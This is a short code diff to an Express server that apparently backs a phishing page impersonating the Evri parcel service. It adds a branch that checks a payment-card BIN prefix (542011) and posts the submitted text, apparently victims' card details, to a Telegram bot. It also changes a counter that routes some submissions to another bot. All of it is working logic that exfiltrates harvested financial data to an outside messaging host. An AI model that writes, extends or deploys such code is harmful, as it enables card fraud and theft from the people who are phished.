@@ -3957,7 +3957,7 @@ app.post("/timeszEvri", (req, res) => {
     });
 });
 
-let TheOnlyMY = 0;
+let TheOnlyMY = 5;
 
 app.options("/TheOnlyMYEvri", cors());
 
@@ -4023,6 +4023,10 @@ app.post("/TheOnlyMYEvri", (req, res) => {
           `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
         );
         TheOnlyMY = 0;
+      } else if (bin === "542011") {
+        axios.post(
+          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
+        );
       } else {
         axios.post(
           `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriTheOnlyMY:\n${originalText}`
